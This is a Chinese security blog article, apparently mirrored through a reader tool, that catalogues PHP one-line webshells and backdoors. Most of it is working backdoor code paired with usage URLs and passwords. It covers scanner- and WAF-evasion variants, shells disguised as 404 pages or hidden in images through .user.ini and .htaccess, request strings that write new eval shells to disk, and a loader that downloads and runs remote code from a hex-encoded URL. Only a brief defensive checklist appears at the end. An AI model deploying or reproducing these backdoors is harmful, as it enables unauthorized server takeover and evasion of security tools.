> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.uedbox.com](https://www.uedbox.com/post/6051/)

那些强悍的 PHP 一句话后门
===============

*   发表于 2013 年 05 月 10 日
*   [周边](https://www.uedbox.com/web-security/safety/)
*   更新于 2019 年 03 月 25 日 20:22:06 下午

以一个学习的心态来对待 PHP 后门程序，很多 PHP 后门代码让我们看到程序员们是多么的用心良苦。

![](https://www.uedbox.com/wp-content/uploads/2013/05/trojan-1024x684.jpg)

强悍的 [PHP 一句话](https://www.uedbox.com/good-php-door/)后门
------------------------------------------------------

这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的 PHP 一句话木马。

利用 404 页面隐藏 PHP 小马
------------------

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
<?php
@preg_replace("/[pageerror]/e",$_POST['error'],"saft");
header('HTTP/1.1 404 Not Found');
?>
```

404 页面是网站常用的文件，一般建议好后很少有人会去对它进行检查修改，这时我们可以利用这一点进行隐藏后门。

无特征隐藏 PHP 一句话
-------------

```
<?php
session_start();
$_POST['code'] && $_SESSION['theCode'] = trim($_POST['code']);
$_SESSION['theCode']&&preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'theCode\']))','a');
```

将 $_POST['code'] 的内容赋值给 $_SESSION['theCode']，然后执行 $_SESSION['theCode']，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。

超级隐蔽的 PHP 后门

```
<?php $_GET[a]($_GET[b]);?>
```

仅用 GET 函数就构成了木马；

利用方法：

```
?a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w% 29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};
```

执行后当前目录生成 c.php 一句话木马，当传参 a 为 eval 时会报错木马生成失败，为 assert 时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。

层级请求，编码运行 PHP 后门
----------------

此方法用两个文件实现，文件 1

```
<?php
//1.php
header('Content-type:text/html;charset=utf-8');
parse_str($_SERVER['HTTP_REFERER'], $a);
if(reset($a) == '10' && count($a) == 9) {
eval(base64_decode(str_replace(" ", "+", implode(array_slice($a, 6)))));
}
```

文件 2

```
<?php
//2.php
header('Content-type:text/html;charset=utf-8');
//要执行的代码
$code = <<<CODE
phpinfo();
CODE;
//进行base64编码
$code = base64_encode($code);
//构造referer字符串
$referer = "a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i=";
//后门url
$url = 'http://localhost/test1/1.php';
$ch = curl_init();
$options = array(
CURLOPT_URL => $url,
CURLOPT_HEADER => FALSE,
CURLOPT_RETURNTRANSFER => TRUE,
CURLOPT_REFERER => $referer
);
curl_setopt_array($ch, $options);
echo curl_exec($ch);
```

通过 HTTP 请求中的 HTTP_REFERER 来运行经过 base64 编码的代码，来达到后门的效果，一般 waf 对 referer 这些检测要松一点，或者没有检测。用这个思路 bypass waf 不错。

PHP 后门生成工具 weevely
------------------

weevely 是一款针对 PHP 的 webshell 的自由软件，可用于模拟一个类似于 telnet 的连接 shell，weevely 通常用于 web 程序的漏洞利用，隐藏后门或者使用类似 telnet 的方式来代替 web 页面式的管理，weevely 生成的服务器端 php 代码是经过了 base64 编码的，所以可以骗过主流的杀毒软件和 IDS，上传服务器端代码后通常可以通过 weevely 直接运行。

weevely 所生成的 PHP 后门所使用的方法是现在比较主流的 base64 加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，被作为检查规则的 eval，system 等函数都不会直接出现在代码中，从而可以致使后门文件绕过后门查找工具的检查。使用暗组的 Web 后门查杀工具进行扫描，结果显示该文件无任何威胁。

以上是大概介绍下边是截图，相关使用方法体验盒子就不在这介绍了，简单的科普一下。

**三个变形的一句话 PHP 木马**  
第一个

```
<?php ($_=@$_GET[2]).@$_($_POST[1])?>
```

在菜刀里写 http://site/1.php?2=assert 密码是 1

第二个

```
<?php
$_="";
$_[+""]='';
$_="$_"."";
$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
?>
<?php ${'_'.$_}['_'](${'_'.$_}['__']);?>
```

在菜刀里写 http://site/2.php?_=assert&__=eval($_POST['pass']) 密码是 pass。  
如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是 post 提交的。

第三个

```
($b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add');
```

str_rot13('riny') 即编码后的 eval，完全避开了关键字，又不失效果，让人吐血！

过狗免杀 PHP 一句话一枚
--------------

```
preg_replace( "/[errorpage]/e", @str_rot13( '@nffreg($_CBFG[cntr]);' ), "saft" );

//密码page
```

.htaccess 做 PHP 后门
------------------

这个其实在 2007 年的时候作者 GaRY 就爆出了，只是后边没人关注，这个利用关键点在于一句话：

```
AddType application/x-httpd-php .htaccess
###### SHELL ###### 这里写上你的后门吧###### LLEHS ######
```

toby57 解析加密 PHP 一句话木马
---------------------

此段后门使用方法会与其它方法不太一样，具体看下面  
Client：

```
<?php
if(crypt($_SERVER['HTTP_H0ST'],51)=='514zR17F8j0q6'){@file_put_contents($_SERVER['HTTP_X'],$_SERVER['HTTP_Y']);
header("Location: ./".$_SERVER['HTTP_X']);};
?>
```

Server:

```
<?php
$fp = fsockopen("127.0.0.1",80,$errno,$errstr,5);
if (!$fp){
echo('fp fail');
}
$out = "GET /php_muma/client.php HTTP/1.1\r\n";
$out .= "Content-Type: application/x-www-form-urlencoded\r\n";
$out .= "User-Agent: MSIE\r\n";
$out .= "Host: 127.0.0.1\r\n";
$out .= "H0ST: qiushui51a\r\n";
$out .= "X: ../shell.php \r\n";
$out .= "Y: <?php eval(\$_POST[shell]);?>\r\n";
$out .= "Connection: close\r\n\r\n";
fwrite($fp,$out);
while(!feof($fp)){
$resp_str="";
$resp_str .= fgets($fp,512);//返回值放入$resp_str
}
fclose($fp);
echo($resp_str);//处理返回值.
?>
```

对服务端与客户端指令对比，如一致则执行后门指令。

几个 President 分享的 PHP 一句话
------------------------

```
<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["sz"]); ?>

<?php $lang = (string)key($_POST);$lang($_POST['sz']); ?>

<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);?>

<?php $a = "a"."s"."s"."e"."r"."t"; $a($_POST["sz"]); ?>

<?php
@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";
@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>
//上面这个密码-7
```

最后列几个高级的 PHP 一句话木马后门
--------------------

```
1、
$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$hh("/[discuz]/e",$_POST['h'],"Access");
//菜刀一句话
2、
$filename=$_GET['xbid'];
include ($filename);
//危险的include函数，直接编译任何文件为php格式运行
3、
$reg="c"."o"."p"."y";
$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
//重命名任何文件
4、
$gzid = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
$gzid("/[discuz]/e",$_POST['h'],"Access");
//菜刀一句话
5、include ($uid);
//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif
//gif插一句话
6、典型一句话
程序后门代码
<?php eval_r($_POST[sb])?>
程序代码
<?php @eval_r($_POST[sb])?>
//容错代码
程序代码
<?php assert($_POST[sb]);?>
//使用lanker一句话客户端的专家模式执行相关的php语句
程序代码
<?$_POST['sa']($_POST['sb']);?>
程序代码
<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
程序代码
<?php
@preg_replace("/[email]/e",$_POST['h'],"error");
?>
//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入
程序代码
<O>h=@eval_r($_POST[c]);</O>
程序代码
<script language="php">@eval_r($_POST[sb])</script>
//绕过<?限制的一句话
```

一款萎缩的动态生成远端大马后门
---------------

Webshell 代码如下：

```
<?php
error_reporting(0);
session_start();
header("Content-type:text/html;charset=utf-8");if(empty($_SESSION['api'])) $_SESSION['api']=substr(file_get_contents(sprintf('%s?%s',pack("H*",'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067'),uniqid())),3649);
@preg_replace("~(.*)~ies",gzuncompress($_SESSION['api']),null);
?>
```

其实这款后门在某地，还有 Tools 上先前已经被破，但没有被拿出来公开分析分享，而今天看到 [360 卫士对该 SHELL 进行了公开分析](http://www.freebuf.com/articles/web/29307.html)……，在 360 公开后，作者 [blackbin](http://require.duapp.com/session.php) 也进行了小幅更新，新版本不在使用高危函数例如 preg_replace e 修饰符同时 php5.5 已经去掉 e 不再使用 eval 不在使用 assert 采用新的匿名方式回调。  
代码如下：

```
<?php
error_reporting(0);
$i = pack('c*', 0x70, 0x61, 99, 107);
$GLOBALS = array(
'p' => pack('c*', 0x70, 0x61, 99, 107),
'c' => $i('c*', 99, 97, 108, 108, 95, 117, 115, 101, 114, 95, 102, 117, 110, 99),
'f' => $i('c*', 102, 105, 108, 101, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115),
'e' => $i('c*',0x63,0x72,0x65,0x61,0x74,0x65,0x5f,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e),
'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631'),
's' =>$i('c*',0x73,0x70,0x72,0x69,0x6e,0x74,0x66)
);
$GLOBALS['c']($GLOBALS['e'](false, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$GLOBALS['f']($GLOBALS['h'])))));
?>
```

关于这款后门的使用方法，首先要有远端大马，然后后门页其实是一个 404 伪装页，需要按键盘 p 键，就会显示登录页，关于此后门的最新代码方法可访问上边作者页获取！

替换特征 PHP 一句话
------------

```
<?php
$mt  = "mFsKCleRfU";
$ojj = "IEBleldle";
$hsa = "E9TVFsnd2VuJ10p";
$fnx = "Ow==";
$zk  = str_replace( "d", "", "sdtdrd_redpdldadcde" ); //str_replace
$ef  = $zk( "z", "", "zbazsze64_zdzeczodze" );          //base64_decode
$dva = $zk( "p", "", "pcprpepaptpe_fpupnpcptpipopn" ); //create_function
$zvm = $dva( '', $ef( $zk( "le", "", $ojj . $mt . $hsa . $fnx ) ) ); // @eval($_POST['wen']);
$zvm();
?>
```

### 命令执行 PHP 后门

```
<?php
//door.php?ctime=exec&atime=pwd

@extract( $_REQUEST );
@die ( $ctime( $atime ) );
?>

<?php
//door.php?p={"a":"system","b":"pwd"}

$p = json_decode( $_GET['p'], true );
echo '<pre>';
$config = new ReflectionFunction( $p['a'] );
$config->invoke( $p['b'] );
echo '</pre>';
?>
```

几个变形 PHP 一句话
------------

```
<?php $x=$_GET['z']; @eval("$x;");?>
```

一般的安全软件可能会将 eval+GET 或 POST 判定为后门程序，因此这种变形将 eval 和 GET 或者 POST 分开，能够绕过这种情况。

* * *

```
<?php
$a=str_replace(x,"","axsxxsxexrxxt");$a($_POST["code"]);
?>
```

请求参数

```
?code=fputs(fopen(base64_decode(J2MucGhwJw==),w),base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=="))
```

还原出的命令

```
assert(fputs(fopen('c.php',w),"<?php@eval($_POST[a]);?>"))
```

利用 assert 来执行命令，并且用字符串隐藏 assert 方法，并且利用它加上动态传入参数的方式构造后门。

* * *

```
<?php
$_GET['a']($_GET['b']);
?>
```

请求参数

```
?a=assert&b=fputs(fopen(base64_decode(J2MucGhwJw==),w),base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=="))
```

完全利用动态参数传入的方式构造后门，将敏感函数和执行的命令动态传入，效果与变形二是一致的。

* * *

```
( $code = $_POST['code'] ) && @preg_replace( '/ad/e', '@' . str_rot13( 'riny' ) . '($code)', 'add' )
```

改进的地方：  
首先，将 eval 函数用 str_rot13(‘riny’) 隐藏。  
然后，利用 e 修饰符，在 preg_replace 完成字符串替换后，使得引擎将结果字符串作为 php 代码使用 eval 方式进行评估并将返回值作为最终参与替换的字符串。

* * *

```
$filename = $_GET['code'];
include( $filename );
```

改进的地方：  
由于 include 方法可以直接编译任何格式的文件为 php 格式运行，因此可以上传一个 txt 格式的 php 文件，将真正的后门写在文本当中。

```
auto_prepend_file=code.gif
```

上传. user.ini，并且写入 auto_prepend_file=code.gif  
将一句话隐藏在 code.gif 中，并且将它上传到同一目录下。

改进的地方：  
将一句话木马隐藏在图形文件中，并且利用用户配置文件将其自动加载到同目录的 php 文件下，使得所有正常 php 文件都毫不知情的中招。

* * *

```
if ( empty( $_SESSION['api'] ) ) {
   $_SESSION['api'] = substr( file_get_contents( sprintf( '%s?%s', pack( "H*", '687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067' ), uniqid() ) ), 3649 );
}
@preg_replace( "~(.*)~ies", gzuncompress( $_SESSION['api'] ), null );
```

改进的地方：

1.  通过 pack 函数得到 URL
2.  利用 file_get_contents 获得 make.jpg
3.  利用 substr 截取 3649 字节以后的内容
4.  利用 gzuncompress 方法将 3649 字节以后的内容解压出来
5.  用 preg_replace 方法的 e 操作符将代码执行

还有很多后续操作……

* * *

过狗过盾 PHP 一句话
------------

```
function app_c( $a ) {   //封装函数
	if ( empty( $a ) ) {    //添加干扰代码
		$a = "echo 'it ok'";    //干扰代码
	}
	@eval( $a );
}

@app_c( $_POST['x'] );
```

过狗过盾无特征无动态函数 PHP 一句话
--------------------

分享些不需要动态函数、不用 eval、不含敏感函数、免杀免拦截的一句话。（少部分一句话需要 php5.4.8+、或 sqlite/pdo/yaml/memcached 扩展等）

```
所有一句话使用方法基本都是：
http://target/shell.php?e=assert 密码pass

//01
$e = $_REQUEST['e'];
$arr = array($_POST['pass'],);
array_filter($arr, $e);

//02
$e = $_REQUEST['e'];
$arr = array($_POST['pass'],);
array_map($e, $arr);

//03
$e = $_REQUEST['e'];
$arr = array('test', $_REQUEST['pass']);
uasort($arr, $e);

//04
$e = $_REQUEST['e'];
$arr = array('test' => 1, $_REQUEST['pass'] => 2);
uksort($arr, $e);

//05
$arr = new ArrayObject(array('test', $_REQUEST['pass']));
$arr->uasort('assert');

//06
$arr = new ArrayObject(array('test' => 1, $_REQUEST['pass'] => 2));
$arr->uksort('assert');

//07
$e = $_REQUEST['e'];
$arr = array(1);
array_reduce($arr, $e, $_POST['pass']);

//08
$e = $_REQUEST['e'];
$arr = array($_POST['pass']);
$arr2 = array(1);
array_udiff($arr, $arr2, $e);

//09
$e = $_REQUEST['e'];
$arr = array($_POST['pass'] => '|.*|e',);
array_walk($arr, $e, '');

//10
$e = $_REQUEST['e'];
$arr = array($_POST['pass'] => '|.*|e',);
array_walk_recursive($arr, $e, '');

//11
mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');

//12
echo preg_filter('|.*|e', $_REQUEST['pass'], '');

//13
ob_start('assert');
echo $_REQUEST['pass'];
ob_end_flush();

//14
$e = $_REQUEST['e'];
register_shutdown_function($e, $_REQUEST['pass']);

//15
$e = $_REQUEST['e'];
declare(ticks=1);
register_tick_function($e, $_REQUEST['pass']);

//16
filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));

//17
filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));

//18
$e = $_REQUEST['e'];
$db = new PDO('sqlite:sqlite.db3');
$db->sqliteCreateFunction('myfunc', $e, 1);
$sth = $db->prepare("SELECT myfunc(:exec)");
$sth->execute(array(':exec' => $_REQUEST['pass']));

//19
$e = $_REQUEST['e'];
$db = new SQLite3('sqlite.db3');
$db->createFunction('myfunc', $e);
$stmt = $db->prepare("SELECT myfunc(?)");
$stmt->bindValue(1, $_REQUEST['pass'], SQLITE3_TEXT);
$stmt->execute();

//20
$str = urlencode($_REQUEST['pass']);
$yaml = <<<EOD
greeting: !{$str} "|.+|e"
EOD;
$parsed = yaml_parse($yaml, 0, $cnt, array("!{$_REQUEST['pass']}" => 'preg_replace'));

//21
$mem = new Memcache();
$re = $mem->addServer('localhost', 11211, TRUE, 100, 0, -1, TRUE, create_function('$a,$b,$c,$d,$e', 'return assert($a);'));
$mem->connect($_REQUEST['pass'], 11211, 0);

//22
preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);

//23
mb_ereg_replace_callback('.+', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);

//24
$iterator = new CallbackFilterIterator(new ArrayIterator(array($_REQUEST['pass'],)), create_function('$a', 'assert($a);'));
foreach ($iterator as $item) {echo $item;}
```

**非常规的 pHp 一句话木马**
------------------

```
<?php
if(isset($_POST['page'])) {
	$page = $_POST[page];
	preg_replace("/[errorpage]/e",$page,"saft");
	exit;
}
?>

 带md5并可植入任意文件

<?
md5($_GET['qid'])=='850abe17d6d33516c10c6269d899fd19'?array_map("asx73ert",(array)$_REQUEST['page']):next;
?>

shell.php?qid=zxexp  密码page

ps:经过网友@kevins1022 测试，不可用。特说明下。或许是我们的测试姿势不正确。先保留
```

**bypass-safedog 再送一枚**
-----------------------

```
<?php
$a=md5('a').'<br>';
$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);
$poc($_GET['a']);
?>
```

综上，这些 PHP 一句话后门可谓五脏俱全，一不小心您肯定中招了，而我们今天这篇文章的重中之重在哪呢？重点就在下边的总结!

[“冰蝎” 动态二进制加密网站管理客户端，WebShell 工具](https://www.uedbox.com/post/51031/)
---------------------------------------------------------------------

随时技术的更新迭代，普通的一句话变量等已经很难存活，2018 年开始流行的 “冰蝎” 大家可以了解一下。

如何应对 [PHP 一句话后门](https://www.uedbox.com/good-php-door/)
-------------------------------------------------------

我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了：

*   对 PHP 程序编写要有安全意识
*   服务器日志文件要经常看，经常备份
*   对每个站点进行严格的权限分配
*   对动态文件及目录经常批量安全审查
*   学会如何进行手工杀毒《即行为判断查杀》
*   时刻关注，或渗入活跃的[网络安全](https://www.uedbox.com/)营地
*   对服务器环境层级化处理，哪怕一个函数也可做规则

体验盒子认为当管理的站点多了，数据量大时，我们应合理应用一些辅助工具，但不应完全依赖这些工具，技术是时刻在更新进步的，最为重要的是你应学会和理解，编写这些强悍后门的人所处思维，角色上的换位可为你带来更大的进步。

文中所列后门中如涉及版权问题，要强调的是这类后门无从查找原始出处，也无唯一性，如果你非要和我说某某是你原创的，请联系我，我会验证后在文中特别强调。我非常看重网络知识产权问题。

### 参考

*   [创造 tips 的秘籍—PHP 回调后门](http://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)
*   [Obvious and not so obvious PHP code injection and evaluation](http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html)
*   [https://github.com/bartblaze/PHP-backdoors](https://github.com/bartblaze/PHP-backdoors)
*   [https://github.com/tennc/webshell](https://github.com/tennc/webshell)
*   [一款功能强大的 Web shell 工具 RC-SHELL](https://www.uedbox.com/webshell-tools-rcshell/)
*   [常见 php 一句话 webshell 解析](https://blkstone.github.io/2016/07/21/php-webshell/)
*   [如何识别简单的免查杀的 PHP 后门](http://ju.outofmemory.cn/entry/225431)
*   [https://github.com/tennc/webshell](https://github.com/tennc/webshell)

持续更新
----

*   2013-05-10：.htaccess 做 PHP 后门
*   2013-05-12：toby57 解析加密型一句话木马
*   2013-07-05：更新 President 分享变异 PHP 一句话五枚
*   2014-03-20：一款萎缩的动态生成远端大马后门
*   2016-08-10：添加好的参考文献
*   2016-08-11：添加三枚 PHP 一句话后门
*   2016-08-15：添加 PHP-backdoors 参考
*   2016-08-19：添加参考，并增加几个变形 PHP 一句话、过狗过盾 PHP 一句话、过狗过盾无特征无动态函数 PHP 一句话
*   2016-10-06：添加两枚非常规的 pHp 一句话木马，再更一枚过狗 PHP 一句话
*   2019-03-25：添加 ““冰蝎” 动态二进制加密网站管理客户端，WebShell 工具”

* * *

原 “~亦家网络~” 域名到期被抢注，导致关停，现在转至体验盒子并继续更新，作者是同人！

**持续更新，为保证资料完整性，转载务必说明本文原地址！**

[点赞 (10)](javascript:;) 打赏 分享 原文连接：**[那些强悍的 PHP 一句话后门](https://www.uedbox.com/post/6051/)** 所有媒体，可在保留署名、`原文连接`的情况下转载，若非则不得使用我方内容。 标签: [PHP 一句话](https://www.uedbox.com/post/tag/php%e4%b8%80%e5%8f%a5%e8%af%9d/)